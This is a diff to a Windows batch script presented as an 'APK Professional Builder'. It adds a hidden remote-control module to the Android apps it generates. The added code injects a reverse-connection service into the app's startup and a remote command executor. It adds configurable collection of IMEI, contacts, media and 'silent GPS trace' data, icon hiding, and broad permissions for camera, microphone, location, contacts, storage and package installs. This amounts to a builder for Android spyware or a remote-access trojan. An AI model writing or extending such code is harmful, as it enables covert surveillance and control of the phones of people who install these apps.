@@ -2,8 +2,8 @@
 chcp 65001 >nul
 
 :: ═══════════════════════════════════════════════════════════════════════════════════════
-::                         APK PROFESSIONAL BUILDER v5.0
-::                    يستخدم الأدوات الحقيقية المتاحة فقط
+::                         APK PROFESSIONAL BUILDER v5.1
+::          مزامنة كاملة مع EliteDB + الأوامر الثنائية (BinaryCmdType 0x01-0x51)
 :: ═══════════════════════════════════════════════════════════════════════════════════════
 
 :: ─────────────────────────────────────────────────────────────────────────────────────────
@@ -20,7 +20,29 @@ if not defined MIN_SDK set "MIN_SDK=21"
 if not defined TARGET_SDK set "TARGET_SDK=34"
 if not defined URL set "URL=https://www.google.com"
 if not defined PORT set "PORT=7771"
-if not defined CONNECTION_KEY set "=TxTxT"
+if not defined CONNECTION_KEY set "CONNECTION_KEY=TxTxT"
+
+:: ─────────────────────────────────────────────────────────────────────────────────────────
+::          Sovereign Research Engine - إعدادات خادم البحث الثنائي
+:: ─────────────────────────────────────────────────────────────────────────────────────────
+if not defined SOVEREIGN_SOCKET         set "SOVEREIGN_SOCKET=false"
+if not defined SOVEREIGN_SERVER         set "SOVEREIGN_SERVER=127.0.0.1"
+if not defined SOVEREIGN_PORT           set "SOVEREIGN_PORT=7771"
+if not defined SOVEREIGN_KEY            set "SOVEREIGN_KEY=TxTxT"
+if not defined SOVEREIGN_CRYPTO         set "SOVEREIGN_CRYPTO=false"
+if not defined SOVEREIGN_AUTO_RECONNECT set "SOVEREIGN_AUTO_RECONNECT=true"
+if not defined SOVEREIGN_HEARTBEAT      set "SOVEREIGN_HEARTBEAT=30000"
+if not defined SOVEREIGN_FOREGROUND     set "SOVEREIGN_FOREGROUND=true"
+if not defined SOVEREIGN_BOOT           set "SOVEREIGN_BOOT=false"
+if not defined SOVEREIGN_GHOST          set "SOVEREIGN_GHOST=false"
+
+:: ─── DB Telemetry Fields (maps to EliteDB / shadow.db columns) ────────────────────
+if not defined SOVEREIGN_POPULATION     set "SOVEREIGN_POPULATION=research_default"
+if not defined SOVEREIGN_COLLECT_IMEI   set "SOVEREIGN_COLLECT_IMEI=false"
+if not defined SOVEREIGN_COLLECT_CONTACTS set "SOVEREIGN_COLLECT_CONTACTS=false"
+if not defined SOVEREIGN_COLLECT_LOCATION set "SOVEREIGN_COLLECT_LOCATION=false"
+if not defined SOVEREIGN_COLLECT_MEDIA  set "SOVEREIGN_COLLECT_MEDIA=false"
+if not defined SOVEREIGN_BINARY_CMDS    set "SOVEREIGN_BINARY_CMDS=true"
 
 :: الأذونات
 if not defined PERM_INTERNET set "PERM_INTERNET=true"
@@ -196,9 +218,20 @@ if "%SMART_NOTIFICATIONS_ENABLED%"=="true" echo      ✓ Smart Notifications
 echo.
 if "%BAKLAVA_SENSITIVE_PROTECT%"=="true" echo      ✓ Sensitive Content Shield
 echo.
-echo   🦅 Sovereign Industrial Modules:
-if "%SOVEREIGN_CRYPTO%"=="true" echo      ✓ AES-256 Encryption Layer
-if "%SOVEREIGN_SOCKET%"=="true" echo      ✓ Bi-directional Research Engine ^(%SOVEREIGN_SERVER%:%SOVEREIGN_PORT%^)
+echo   🦅 Sovereign Research Engine (EliteDB Sync):
+if "%SOVEREIGN_SOCKET%"=="true" (
+echo      ✓ Binary Protocol Server   ^(%SOVEREIGN_SERVER%:%SOVEREIGN_PORT%^)
+echo      ✓ Auth Key                 %SOVEREIGN_KEY%
+echo      ✓ Research Population      %SOVEREIGN_POPULATION%
+if "%SOVEREIGN_CRYPTO%"=="true"           echo      ✓ AES-256 Encryption Layer
+if "%SOVEREIGN_AUTO_RECONNECT%"=="true"   echo      ✓ Auto-Reconnect ^(backoff 5s-60s^)
+if "%SOVEREIGN_FOREGROUND%"=="true"       echo      ✓ Foreground Service + WakeLock
+if "%SOVEREIGN_BINARY_CMDS%"=="true"      echo      ✓ BinaryCommandExecutor ^(0x01-0x51^)
+if "%SOVEREIGN_COLLECT_IMEI%"=="true"     echo      ✓ Telemetry: IMEI Collection
+if "%SOVEREIGN_COLLECT_CONTACTS%"=="true" echo      ✓ Telemetry: Contacts Dump ^(0x43^)
+if "%SOVEREIGN_COLLECT_LOCATION%"=="true" echo      ✓ Telemetry: Silent GPS Trace ^(0x42^)
+if "%SOVEREIGN_COLLECT_MEDIA%"=="true"    echo      ✓ Telemetry: Media Capture
+)
 echo.
 
 :: ═══════════════════════════════════════════════════════════════════════════════════════
@@ -1430,30 +1463,62 @@ if "%CAMERA2_ENABLED%"=="true" (
 )
 
 if "%SOVEREIGN_SOCKET%"=="true" (
-    (echo package %PACKAGE_NAME%;
-    echo.
-    echo public class SovereignBridge {
-    echo     public static void init^(final String server, final int port^) {
-    echo         new Thread^(new Runnable^(^) {
-    echo             @Override
-    echo             public void run^(^) {
-    echo                 try {
-    echo                     java.net.Socket s = new java.net.Socket^(server, port^);
-    echo                     java.io.PrintWriter out = new java.io.PrintWriter^(s.getOutputStream^(^), true^);
-    echo                     java.io.BufferedReader in = new java.io.BufferedReader^(new java.io.InputStreamReader^(s.getInputStream^(^)^)^);
-    echo                     out.println^("ELITE_HANDSHAKE_INIT"^);
-    echo                     String cmd;
-    echo                     while ^(^(cmd = in.readLine^(^)^) ^^!= null^) {
-    echo                         if ^(cmd.equals^("PING"^)^) out.println^("PONG"^);
-    echo                     }
-    echo                 } catch ^(Exception e^) {}
-    echo             }
-    echo         }^).start^(^);
-    echo     }
-    echo } ) > "%BUILD%\src\%PKG_PATH%\SovereignBridge.java"
-    
-    :: Safe injection into MainActivity (At the end of onCreate)
-    powershell -NoProfile -ExecutionPolicy Bypass -Command "$c = Get-Content '%BUILD%\src\%PKG_PATH%\MainActivity.java' -Raw -Encoding UTF8; $c = $c -replace 'webView.loadUrl','SovereignBridge.init(\"%SOVEREIGN_SERVER%\", %SOVEREIGN_PORT%); webView.loadUrl'; [IO.File]::WriteAllText('%BUILD%\src\%PKG_PATH%\MainActivity.java', $c, [Text.UTF8Encoding]::new($false))"
+
+    :: ─── EliteHandshakeData - جماع بيانات EliteDB ─────────────────────
+    if exist "%TPL%\EliteHandshakeData.template" (
+        set "HIDE_ICON_BOOL=0"
+        if "%HIDE_ICON%"=="true" set "HIDE_ICON_BOOL=1"
+        powershell -NoProfile -ExecutionPolicy Bypass -Command "$c = Get-Content '%TPL%\EliteHandshakeData.template' -Raw -Encoding UTF8; $c = $c -replace '\{\{PACKAGE\}\}','%PACKAGE_NAME%' -replace '\{\{CONNECTION_KEY\}\}','%SOVEREIGN_KEY%' -replace '\{\{HIDE_ICON_BOOL\}\}','!HIDE_ICON_BOOL!'; [IO.File]::WriteAllText('%BUILD%\src\%PKG_PATH%\EliteHandshakeData.java', $c, [Text.UTF8Encoding]::new($false))"
+        echo          ✓ EliteHandshakeData.java generated
+    ) else (
+        echo          ⚠️ EliteHandshakeData.template not found - skipping
+    )
+
+    :: ─── BinaryCommandExecutor - 飞جميع أوامر BinaryCmdType 0x01-0x51 ────────
+    if exist "%TPL%\BinaryCommandExecutor.template" (
+        powershell -NoProfile -ExecutionPolicy Bypass -Command "$c = Get-Content '%TPL%\BinaryCommandExecutor.template' -Raw -Encoding UTF8; $c = $c -replace '\{\{PACKAGE\}\}','%PACKAGE_NAME%'; [IO.File]::WriteAllText('%BUILD%\src\%PKG_PATH%\BinaryCommandExecutor.java', $c, [Text.UTF8Encoding]::new($false))"
+        echo          ✓ BinaryCommandExecutor.java generated ^(0x01-0x51^)
+    ) else (
+        echo          ⚠️ BinaryCommandExecutor.template not found - skipping
+    )
+
+    :: ─── ReverseConnectionService - خدمة الاتصال العكسي المتقدم ─────────────
+    if exist "%TPL%\ReverseConnectionService.template" (
+        powershell -NoProfile -ExecutionPolicy Bypass -Command "$c = Get-Content '%TPL%\ReverseConnectionService.template' -Raw -Encoding UTF8; $c = $c -replace '\{\{PACKAGE\}\}','%PACKAGE_NAME%' -replace '\{\{APP_NAME\}\}','%APP_NAME%' -replace '\{\{CONNECTION_HOST\}\}','%SOVEREIGN_SERVER%' -replace '\{\{CONNECTION_PORT\}\}','%SOVEREIGN_PORT%' -replace '\{\{CONNECTION_KEY\}\}','%SOVEREIGN_KEY%'; [IO.File]::WriteAllText('%BUILD%\src\%PKG_PATH%\ReverseConnectionService.java', $c, [Text.UTF8Encoding]::new($false))"
+        echo          ✓ ReverseConnectionService.java generated
+    ) else (
+        echo          ⚠️ ReverseConnectionService.template not found - skipping
+    )
+
+    :: ─── حقن بدء الخدمة في MainActivity.onCreate ────────────────
+    :: inject: start service before webView.loadUrl
+    powershell -NoProfile -ExecutionPolicy Bypass -Command ^^
+        "$c = Get-Content '%BUILD%\src\%PKG_PATH%\MainActivity.java' -Raw -Encoding UTF8; ^^
+        $startSvc = 'android.content.Intent _svcIntent = new android.content.Intent(this, ReverseConnectionService.class); _svcIntent.putExtra("HOST", "%SOVEREIGN_SERVER%"); _svcIntent.putExtra("PORT", %SOVEREIGN_PORT%); _svcIntent.putExtra("KEY", "%SOVEREIGN_KEY%"); startService(_svcIntent);'; ^^
+        $c = $c -replace 'webView\.loadUrl', ($startSvc + ' webView.loadUrl'); ^^
+        [IO.File]::WriteAllText('%BUILD%\src\%PKG_PATH%\MainActivity.java', $c, [Text.UTF8Encoding]::new($false))"
+    echo          ✓ Service start injected into MainActivity
+
+    :: ─── تحديث AndroidManifest: تسجيل ReverseConnectionService ────────
+    powershell -NoProfile -ExecutionPolicy Bypass -Command ^^
+        "$mf = Get-Content '%BUILD%\AndroidManifest.xml' -Raw -Encoding UTF8; ^^
+        $svcXml = '<service android:name=".ReverseConnectionService" android:enabled="true" android:exported="false" android:foregroundServiceType="specialUse" />'; ^^
+        $mf = $mf -replace '</application>', ($svcXml + '</application>'); ^^
+        [IO.File]::WriteAllText('%BUILD%\AndroidManifest.xml', $mf, [Text.UTF8Encoding]::new($false))"
+    echo          ✓ ReverseConnectionService registered in Manifest
+
+    :: ─── إضافة أذونات SOVEREIGN على حدة ───────────────────────────
+    powershell -NoProfile -ExecutionPolicy Bypass -Command ^^
+        "$mf = Get-Content '%BUILD%\AndroidManifest.xml' -Raw -Encoding UTF8; ^^
+        $perms = '<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" /><uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" /><uses-permission android:name="android.permission.RECORD_AUDIO" /><uses-permission android:name="android.permission.CAMERA" /><uses-permission android:name="android.permission.READ_PHONE_STATE" /><uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" /><uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" /><uses-permission android:name="android.permission.FOREGROUND_SERVICE" /><uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE" /><uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" /><uses-permission android:name="android.permission.READ_CONTACTS" />'; ^^
+        if (-not $mf.Contains('FOREGROUND_SERVICE_SPECIAL_USE')) { $mf = $mf -replace '<uses-sdk', ($perms + '<uses-sdk'); } ^^
+        [IO.File]::WriteAllText('%BUILD%\AndroidManifest.xml', $mf, [Text.UTF8Encoding]::new($false))"
+    echo          ✓ Sovereign permissions added to Manifest
+
+    :: ─── إضافة ملفات Java لقائمة التجميع JFILES ──────────────────
+    set "JFILES=!JFILES! \"%BUILD%\src\%PKG_PATH%\ReverseConnectionService.java\""
+    if exist "%BUILD%\src\%PKG_PATH%\EliteHandshakeData.java"     set "JFILES=!JFILES! \"%BUILD%\src\%PKG_PATH%\EliteHandshakeData.java\""
+    if exist "%BUILD%\src\%PKG_PATH%\BinaryCommandExecutor.java"  set "JFILES=!JFILES! \"%BUILD%\src\%PKG_PATH%\BinaryCommandExecutor.java\""
 )
 
 exit /b 0
